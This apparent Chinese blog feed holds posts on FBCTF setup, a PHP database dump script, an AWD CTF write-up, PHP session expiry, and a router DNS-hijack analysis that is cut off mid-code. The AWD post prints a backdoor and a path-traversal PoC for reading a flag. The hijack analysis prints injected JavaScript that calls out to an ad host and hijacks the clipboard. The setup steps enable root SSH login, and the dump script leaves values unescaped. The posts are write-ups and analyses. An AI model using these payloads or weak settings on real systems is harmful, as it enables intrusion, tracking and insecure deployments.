        <content type="html"><![CDATA[<p>记录下校园网内搭建FBCTF那些坑</p><a id="more"></a><p>测试通过的环境：</p><blockquote><p>全新安装的Ubuntu 16.04</p></blockquote><h1 id="Ubuntu配置"><a href="#Ubuntu配置" class="headerlink" title="Ubuntu配置"></a>Ubuntu配置</h1><h2 id="启用ROOT账户"><a href="#启用ROOT账户" class="headerlink" title="启用ROOT账户"></a>启用ROOT账户</h2><ol><li><p>使用:<code>sudo passwd root</code>设置root的密码</p></li><li><p>使用<code>su root</code>来测试是否可以进入root用户，如果出现#说明已经设置root用户的密码成功</p></li><li><p>进入到<code>/usr/share/lightdm/lightdm.conf.d/</code>目录，使用<code>gedit 50-unity-greeter.conf &amp;</code>命令打开<code>50-unity-greeter.conf</code> 文件</p></li><li><p>文件末尾添加</p></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user-session&#x3D;ubuntu</span><br><span class="line">greeter-show-manual-login&#x3D;true</span><br><span class="line">allow-guest&#x3D;false</span><br></pre></td></tr></table></figure><ol start="5"><li>保存重启</li><li>此时会出现读取/root/.profile时发现错误的对话框，点击确定按钮，进入系统，使用<code>vi /root/.profile</code>命令修改文件，找<code>到mesg n</code>，修改为：<code>tty -s &amp;&amp; mesg n</code><br>如下图<br><img src= "/img/loading.gif" data-lazy-src="/images/odNj9tW.png" alt=""><blockquote><p>具体参考<a href="https://blog.csdn.net/sunxiaoju/article/details/51993091" target="_blank" rel="noopener">https://blog.csdn.net/sunxiaoju/article/details/51993091</a></p></blockquote></li></ol><h1 id="允许ROOT连接SSH"><a href="#允许ROOT连接SSH" class="headerlink" title="允许ROOT连接SSH"></a>允许ROOT连接SSH</h1><ol><li>编辑<code>sudo vi /etc/ssh/sshd_config</code></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin prohibit-password</span><br><span class="line">StrictModes yes</span><br></pre></td></tr></table></figure><p>更改为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line">LoginGraceTime 120</span><br><span class="line">#PermitRootLogin prohibit-password</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br></pre></td></tr></table></figure><ol start="2"><li>重启ssh</li></ol><p><code>sudo service ssh restart</code></p><h1 id="搭建FBCTF"><a href="#搭建FBCTF" class="headerlink" title="搭建FBCTF"></a>搭建FBCTF</h1><h2 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h2><blockquote><p>由于众所周知的原因，以下部分内容需要梯子来进行【会注明】</p></blockquote><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p><code>apt-get install git</code></p><h2 id="抓取仓库"><a href="#抓取仓库" class="headerlink" title="抓取仓库"></a>抓取仓库</h2><p><code>git clone https://github.com/facebook/fbctf</code></p><h2 id="上传lang-zh-cn到src-language汉化"><a href="#上传lang-zh-cn到src-language汉化" class="headerlink" title="上传lang_zh-cn到src_language汉化"></a>上传lang_zh-cn到src_language汉化</h2><p>下载地址：<a href="https://blog.ctftools.com/2017/03/post106/" target="_blank" rel="noopener">https://blog.ctftools.com/2017/03/post106/</a></p><blockquote><p>以下内容为需要梯子的部分</p></blockquote><h2 id="解决dl-hhvm-com超时问题"><a href="#解决dl-hhvm-com超时问题" class="headerlink" title="解决dl.hhvm.com超时问题"></a>解决dl.hhvm.com超时问题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;140.211.166.134 dl.hhvm.com&#39; &gt;&gt; &#x2F;etc&#x2F;hosts</span><br><span class="line">wget -O - http:&#x2F;&#x2F;dl.hhvm.com&#x2F;conf&#x2F;hhvm.gpg.key | sudo apt-key add -</span><br><span class="line">echo deb http:&#x2F;&#x2F;dl.hhvm.com&#x2F;ubuntu trusty main | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;hhvm.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install hhvm</span><br></pre></td></tr></table></figure><p>安装composer国内镜像加速下载:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -sS https:&#x2F;&#x2F;getcomposer.org&#x2F;installer | php</span><br><span class="line">mv composer.phar &#x2F;usr&#x2F;local&#x2F;bin&#x2F;composer</span><br><span class="line">composer config -g repositories.packagist composer http:&#x2F;&#x2F;packagist.phpcomposer.com</span><br><span class="line">composer install --profile --no-dev</span><br></pre></td></tr></table></figure><h2 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h2><p>从<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">https://nodejs.org/en/download/</a> 下载源码压缩包 </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zxvf .&#x2F;xxxxxx</span><br><span class="line">apt-get install build-essential   &#x2F;&#x2F;安装G++</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><p><code>mkdir -p /var/www/fbctf</code></p><h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><p><code>./extra/provision.sh -m prod -s $PWD</code></p><blockquote><p>具体参考<br><a href="https://github.com/facebook/fbctf/wiki/Quick-Setup-Guide" target="_blank" rel="noopener">https://github.com/facebook/fbctf/wiki/Quick-Setup-Guide</a><br><a href="https://blog.0wning.me/2017/10/21/%E5%9B%BD%E5%86%85%E6%90%AD%E5%BB%BAFBCTF%E5%B9%B3%E5%8F%B0/" target="_blank" rel="noopener">https://blog.0wning.me/2017/10/21/%E5%9B%BD%E5%86%85%E6%90%AD%E5%BB%BAFBCTF%E5%B9%B3%E5%8F%B0/</a></p></blockquote><h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/z888f7h.png" alt=""><br>主页</p><p><img src= "/img/loading.gif" data-lazy-src="/images/VtcnpIz.png" alt=""><br>后台</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://blog.csdn.net/sunxiaoju/article/details/51993091" target="_blank" rel="noopener">https://blog.csdn.net/sunxiaoju/article/details/51993091</a></p><p><a href="https://blog.ctftools.com/2017/03/post122/" target="_blank" rel="noopener">https://blog.ctftools.com/2017/03/post122/</a></p><p><a href="https://blog.ctftools.com/2017/03/post106/" target="_blank" rel="noopener">https://blog.ctftools.com/2017/03/post106/</a></p><p><a href="https://blog.0wning.me/2017/10/21/%E5%9B%BD%E5%86%85%E6%90%AD%E5%BB%BAFBCTF%E5%B9%B3%E5%8F%B0/" target="_blank" rel="noopener">https://blog.0wning.me/2017/10/21/%E5%9B%BD%E5%86%85%E6%90%AD%E5%BB%BAFBCTF%E5%B9%B3%E5%8F%B0/</a></p><p><a href="https://brucetg.github.io/2018/04/30/ubuntu14-04%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E6%90%AD%E5%BB%BAfbctf%E7%BA%BF%E4%B8%8A%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0/" target="_blank" rel="noopener">https://brucetg.github.io/2018/04/30/ubuntu14-04%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E6%90%AD%E5%BB%BAfbctf%E7%BA%BF%E4%B8%8A%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0/</a></p><p><a href="https://blog.csdn.net/wy_97/article/details/78294562" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78294562</a></p><p><a href="http://www.chengweiyang.cn/2016/03/07/transparent-cache-cause-apt-get-hash-sum-mismatch/" target="_blank" rel="noopener">http://www.chengweiyang.cn/2016/03/07/transparent-cache-cause-apt-get-hash-sum-mismatch/</a></p><p><a href="http://dockone.io/article/366" target="_blank" rel="noopener">http://dockone.io/article/366</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原生PHP导出数据库</title>
      <link href="/p/766736382.html"/>
      <url>/p/766736382.html</url>
      
        <content type="html"><![CDATA[<p>网上找了下相关代码基本都是有语法错误的，挑了个错误少的改了改</p><a id="more"></a><p>通过测试的环境</p><blockquote><p>CentOS7.1<br>PHP7.2.10<br>MySQL5.7.23<br>Apache 2.4.34</p></blockquote><p>代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="comment">//配置信息</span></span><br><span class="line">$cfg_dbhost      = <span class="string">'localhost'</span>;</span><br><span class="line">$cfg_dbname      = <span class="string">''</span>;<span class="comment">//数据库名</span></span><br><span class="line">$cfg_dbuser      = <span class="string">''</span>;<span class="comment">//数据库用户</span></span><br><span class="line">$cfg_dbpwd       = <span class="string">''</span>;<span class="comment">//数据库密码</span></span><br><span class="line">$cfg_db_language = <span class="string">'utf8'</span>;</span><br><span class="line">$to_file_name    = <span class="string">"dbname.sql"</span>; <span class="comment">//你即将导出的数据库命名</span></span><br><span class="line"><span class="comment">// END 配置</span></span><br><span class="line"><span class="comment">//链接数据库</span></span><br><span class="line">$link = mysqli_connect($cfg_dbhost, $cfg_dbuser, $cfg_dbpwd);</span><br><span class="line">mysqli_select_db($link, $cfg_dbname);</span><br><span class="line"></span><br><span class="line"><span class="comment">//选择编码</span></span><br><span class="line">mysqli_query($link, <span class="string">"set names "</span> . $cfg_db_language);</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据库中有哪些表</span></span><br><span class="line">$tables = mysqli_query($link, <span class="string">"SHOW TABLES FROM "</span> . $cfg_dbname);</span><br><span class="line"><span class="comment">//将这些表记录到一个数组</span></span><br><span class="line">$tabList = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_row($tables)) &#123;</span><br><span class="line"></span><br><span class="line">    $tabList[] = $row[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"运行中，请耐心等待...&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$info = <span class="string">"-- ----------------------------\r\n"</span>;</span><br><span class="line">$info .= <span class="string">"-- 日期："</span> . date(<span class="string">"Y-m-d H:i:s"</span>, time()) . <span class="string">"\r\n"</span>;</span><br><span class="line">$info .= <span class="string">"-- ----------------------------\r\n\r\n"</span>;</span><br><span class="line">file_put_contents(<span class="string">'./db_backup/'</span>. $to_file_name, $info, FILE_APPEND);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将每个表的表结构导出到文件</span></span><br><span class="line"><span class="keyword">foreach</span> ($tabList <span class="keyword">as</span> $val) &#123;</span><br><span class="line">    $sql  = <span class="string">"show create table "</span> . $val . <span class="string">";"</span>;</span><br><span class="line">    $res  = mysqli_query($link, $sql);</span><br><span class="line">    $row  = mysqli_fetch_array($res);</span><br><span class="line">    $info = <span class="string">"-- ----------------------------\r\n"</span>;</span><br><span class="line">    $info .= <span class="string">"-- Table structure for `"</span> . $val . <span class="string">"`\r\n"</span>;</span><br><span class="line">    $info .= <span class="string">"-- ----------------------------\r\n"</span>;</span><br><span class="line">    $info .= <span class="string">"DROP TABLE IF EXISTS `"</span> . $val . <span class="string">"`;\r\n"</span>;</span><br><span class="line">    $sqlStr = $info . $row[<span class="number">1</span>] . <span class="string">";\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//追加到文件</span></span><br><span class="line">    file_put_contents(<span class="string">'./db_backup/'</span>. $to_file_name, $sqlStr, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line"></span><br><span class="line">    mysqli_free_result($res);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将每个表的数据导出到文件</span></span><br><span class="line"><span class="keyword">foreach</span> ($tabList <span class="keyword">as</span> $val) &#123;</span><br><span class="line">    $sql = <span class="string">"select * from "</span> . $val . <span class="string">";"</span>;</span><br><span class="line">    $res = mysqli_query($link, $sql);</span><br><span class="line">    <span class="comment">//如果表中没有数据，则继续下一张表</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_num_rows($res) &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    $info = <span class="string">"-- ----------------------------\r\n"</span>;</span><br><span class="line">    $info .= <span class="string">"-- Records for `"</span> . $val . <span class="string">"`\r\n"</span>;</span><br><span class="line">    $info .= <span class="string">"-- ----------------------------\r\n"</span>;</span><br><span class="line">    file_put_contents(<span class="string">'./db_backup/'</span>. $to_file_name, $info, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取数据</span></span><br><span class="line">    <span class="keyword">while</span> ($row = mysqli_fetch_row($res)) &#123;</span><br><span class="line">        $sqlStr = <span class="string">"INSERT INTO `"</span> . $val . <span class="string">"` VALUES ("</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($row <span class="keyword">as</span> $zd) &#123;</span><br><span class="line">            $sqlStr .= <span class="string">"'"</span> . $zd . <span class="string">"', "</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//去掉最后一个逗号和空格</span></span><br><span class="line">        $sqlStr = substr($sqlStr, <span class="number">0</span>, strlen($sqlStr) - <span class="number">2</span>);</span><br><span class="line">        $sqlStr .= <span class="string">");\r\n"</span>;</span><br><span class="line">        file_put_contents(<span class="string">'./db_backup/'</span>. $to_file_name, $sqlStr, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    mysqli_free_result($res);</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="string">'./db_backup/'</span>. $to_file_name, <span class="string">"\r\n"</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"导出成功，文件路径:./db_backup/"</span>. $to_file_name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯线下AWD【WEB】</title>
      <link href="/p/1305981138.html"/>
      <url>/p/1305981138.html</url>
      
        <content type="html"><![CDATA[<p>不得不说AWD对WEB狗越来越不友好了</p><a id="more"></a><p>Down下网站源码后上<code>Seay源代码审计工具</code>直接自动审计一波<br><img src= "/img/loading.gif" data-lazy-src="/images/zP3P6xS.png" alt=""><br>发现预留后门</p><p>路径<code>/sites/all/modules/avatar_uploader/lib/demo/view.php</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/s3uI9oR.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"uploadDir/$file"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p>直接构造POC:<code>wget http://ip:5072/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../flag</code><br>即可获取目标机上flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中检查会话是否过期</title>
      <link href="/p/3494507906.html"/>
      <url>/p/3494507906.html</url>
      
        <content type="html"><![CDATA[<p>在做项目时遇到了一个小需求</p><a id="more"></a><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>大概意思是要检测当前会话是否过期，网上搜了下基本都是用cookies记录的<br>想了下用Session也可以做</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>可以在登录时用<code>$_SESSION[&#39;Your_Name&#39;]</code>存储登录时的时间然后在访问后台每个页面必经的页面加入会话验证函数<br>大概函数如下<br>登录页在登录成功后加入：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);</span><br><span class="line">$time = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">$_SESSION[<span class="string">'login_time'</span>] = $time;</span><br></pre></td></tr></table></figure><p>函数中加入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检测会话是否过期</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckSession</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);</span><br><span class="line">    $session_time   = $_SESSION[<span class="string">'login_time'</span>];</span><br><span class="line">    $timeout        = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">    $logon_out_time = strtotime($timeout) - strtotime($session_time);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($session_time) || $session_time == <span class="string">''</span> || $logon_out_time &gt;= <span class="number">900</span>)<span class="comment">//检测是否大于15分钟未响应 </span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        session_destroy();</span><br><span class="line">        sweetalert(<span class="string">'会话过期'</span>, <span class="string">'当前会话已超时(15分钟未操作)，请重新登录'</span>, <span class="string">'warning'</span>, <span class="string">'0'</span>, <span class="string">''</span>, <span class="string">'返回'</span>, <span class="string">'login'</span>, <span class="string">'0'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置新会话时间</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetNewSessionTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[<span class="string">'login_time'</span>] = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在必经页面加入函数<code>SetNewSessionTime</code>来证明处于活动状态</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">......Your Codes</span><br><span class="line"><span class="comment">//加载完再做会话验证</span></span><br><span class="line">CheckSession();</span><br><span class="line">SetNewSessionTime();</span><br><span class="line">.....Your Codes</span><br></pre></td></tr></table></figure><p>最后超时效果如下：<br><img src= "/img/loading.gif" data-lazy-src="/images/U2cXmLj.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>斐讯路由DNS劫持</title>
      <link href="/p/2331680408.html"/>
      <url>/p/2331680408.html</url>
      
        <content type="html"><![CDATA[<p>可能是太久没见广告了吧……<br>突然间弹了个牛皮癣</p><a id="more"></a><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在进行线上环境调试时习惯性的按了F12看看前端<br>结果发现<code>Console</code>里有了点不该有的东西<br><img src= "/img/loading.gif" data-lazy-src="/images/jGDQa7l.png" alt=""><br>移动端访问非<code>HTTPS</code>网站更是直接弹了个广告<br><img src= "/img/loading.gif" data-lazy-src="/images/Xwte7nb.jpg" alt=""><br>PC端挂着移动端的UA一样弹广告<br><img src= "/img/loading.gif" data-lazy-src="/images/Bn22QuR.png" alt=""><br>很好 你成功的引起了我的注意</p><h1 id="追查"><a href="#追查" class="headerlink" title="追查"></a>追查</h1><p>首先发现<code>console</code>里请求的JS为<br><code>https://cnd.newapi.com/sdk/cnzz.js?v8</code>和<code>https://logs.newapi.com/jd/ad?f=zq18</code></p><p>ad内容解密后：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.amb_jd_proxy_domain=<span class="string">"logs.newapi.com"</span>;</span><br><span class="line"><span class="built_in">window</span>.amb_jd_cdn_domain=<span class="string">"cnd.newapi.com"</span>;</span><br><span class="line"><span class="built_in">window</span>.amb_jd_proxy_f=<span class="string">"zq18"</span>;</span><br><span class="line"><span class="built_in">window</span>.amb_jd_proxy_c=<span class="string">"2"</span>;</span><br><span class="line"><span class="built_in">window</span>.amb_jd_cnzz_id=<span class="string">"1274015796"</span>;</span><br><span class="line"><span class="built_in">window</span>.amb_jd_tongji_url=<span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">amb_auto_load_ad_js</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">    <span class="keyword">var</span> d = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>];</span><br><span class="line">    c.src = a;</span><br><span class="line">    d.appendChild(c);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> b === <span class="string">"function"</span>) &#123;</span><br><span class="line">        c.onload = c.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!c.readyState || <span class="regexp">/loaded|complete/</span>.test(c.readyState)) &#123;</span><br><span class="line">                b()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">amb_auto_load_ad_js(<span class="string">"https://"</span> + <span class="built_in">window</span>.amb_jd_cdn_domain + <span class="string">"/sdk/cnzz.js?v8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">amb_create_iframe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    a.frameborder = <span class="number">0</span>;</span><br><span class="line">    a.src = <span class="string">"https://"</span> + <span class="built_in">window</span>.amb_jd_cdn_domain + <span class="string">"/sdk/cnzz.php?p="</span> + <span class="built_in">window</span>.amb_jd_proxy_f + <span class="string">"&amp;siteid="</span> + <span class="built_in">window</span>.amb_jd_cnzz_id;</span><br><span class="line">    a.frameBorder = <span class="number">0</span>;</span><br><span class="line">    a.width = <span class="string">"1px"</span>;</span><br><span class="line">    a.height = <span class="string">"1px"</span>;</span><br><span class="line">    a.scrolling = <span class="string">"no"</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(a)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> amb_iframe_time = <span class="string">"no"</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        Clipboard = [];</span><br><span class="line">        clipboard = <span class="literal">null</span></span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">document</span>.body) &#123;</span><br><span class="line">        amb_create_iframe()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (amb_iframe_time == <span class="string">"no"</span> &amp;&amp; <span class="built_in">document</span>.body) &#123;</span><br><span class="line">                amb_create_iframe();</span><br><span class="line">                amb_iframe_time = <span class="string">"yes"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">1500</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>ad请求了cnzz.js，解密后内容为</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">h</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> g = &#123;</span><br><span class="line">        trigger: <span class="literal">null</span>,</span><br><span class="line">        dd: <span class="built_in">document</span>,</span><br><span class="line">        ww: <span class="built_in">window</span>,</span><br><span class="line">        listener: [],</span><br><span class="line">        listenerTouchend: [],</span><br><span class="line">        listenerCopy: <span class="literal">null</span>,</span><br><span class="line">        text: <span class="literal">null</span>,</span><br><span class="line">        action: <span class="string">"copy"</span>,</span><br><span class="line">        ua: <span class="built_in">window</span>.navigator.userAgent,</span><br><span class="line">        host: location.protocol + <span class="string">"//"</span> + location.host,</span><br><span class="line">        id: <span class="string">"default"</span>,</span><br><span class="line">        token: <span class="string">""</span>,</span><br><span class="line">        hascopy: <span class="literal">null</span>,</span><br><span class="line">        hasload: <span class="literal">null</span>,</span><br><span class="line">        hascopy2: <span class="literal">null</span>,</span><br><span class="line">        closeqq: <span class="string">"no"</span>,</span><br><span class="line">        showAd: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.id = <span class="built_in">window</span>.amb_jd_proxy_f;</span><br><span class="line">        &#125;,</span><br><span class="line">        init: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="keyword">this</span>;</span><br><span class="line">            a.trigger = a.dd.getElementsByTagName(<span class="string">"*"</span>);</span><br><span class="line">            a.showAd();</span><br><span class="line">            a.hascopy = a.sGet(<span class="string">"amb_jd_copy"</span>);</span><br><span class="line">            a.hasload = a.sGet(<span class="string">"amb_jd_load"</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> == a.sGet(<span class="string">"amb_jd_open"</span>)) &#123;</span><br><span class="line">                <span class="keyword">var</span> b = <span class="string">""</span>;</span><br><span class="line">                <span class="literal">null</span> != a.sGet(<span class="string">"amb_jd_open_info"</span>) ? (b = a.sGet(<span class="string">"amb_jd_open_info"</span>)) : (b = a.randomString(), a.sSet(<span class="string">"amb_jd_open_info"</span>, b, <span class="built_in">window</span>.amb_jd_proxy_c));</span><br><span class="line">                a._ajax(<span class="string">"//"</span> + <span class="built_in">window</span>.amb_jd_proxy_domain + <span class="string">"/jd/gettokenv2?callback=jsonp"</span> + b, &#123;</span><br><span class="line">                    f: a.id,</span><br><span class="line">                    h: a.hasload,</span><br><span class="line">                    current_url: <span class="built_in">encodeURIComponent</span>(top.location.href)</span><br><span class="line">                &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">                    a.text = b.text;</span><br><span class="line">                    a.token = b.token;</span><br><span class="line">                    a.closeqq = b.closeqq;</span><br><span class="line">                    <span class="keyword">if</span> (b.hascopy == <span class="string">"yes"</span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> amb_has_copy = a.sGet(<span class="string">"amb_jd_has_copy"</span>);</span><br><span class="line">                        <span class="keyword">if</span> (amb_has_copy == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">eval</span>(<span class="string">"amb_auto_copy"</span>) == <span class="string">"function"</span>) &#123;</span><br><span class="line">                                    a.sSet(<span class="string">"amb_jd_has_copy"</span>, <span class="string">"copyed"</span>, <span class="number">3600</span>);</span><br><span class="line">                                    amb_auto_copy();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (b.iscn == <span class="string">"no"</span>) &#123;</span><br><span class="line">                        a.wxcp(b.text);</span><br><span class="line">                    &#125;</span><br><span class="line">                    a.sSet(<span class="string">"amb_jd_load"</span>, <span class="string">"has"</span>, <span class="number">86400</span>);</span><br><span class="line">                    <span class="string">"null"</span> == a.text &amp;&amp; (a.text = <span class="number">0</span>);</span><br><span class="line">                    a.dd.queryCommandSupported &amp;&amp; a.dd.queryCommandSupported(a.action) ? a.text &amp;&amp; (a.listenClick(), a.listenTouchend()) : <span class="number">1</span> &lt; a.ua.split(<span class="string">"MQQBrowser"</span>).length &amp;&amp; <span class="number">1</span> &lt; a.ua.split(<span class="string">"Android"</span>).length &amp;&amp; <span class="number">2</span> &gt; a.ua.split(<span class="string">"MicroMessenger"</span>).length &amp;&amp; <span class="number">2</span> &gt; a.ua.split(<span class="string">"QQ/"</span>).length ? a.text &amp;&amp; a.qqCopy() : (a.listenerCopy = a.listenNode(a.dd.body, <span class="string">"click"</span>, a.clipboardCopy.bind(a)));</span><br><span class="line">                &#125;, <span class="keyword">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        wxcp: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="regexp">/MicroMessenger/i</span>.test(navigator.userAgent)) &#123;</span><br><span 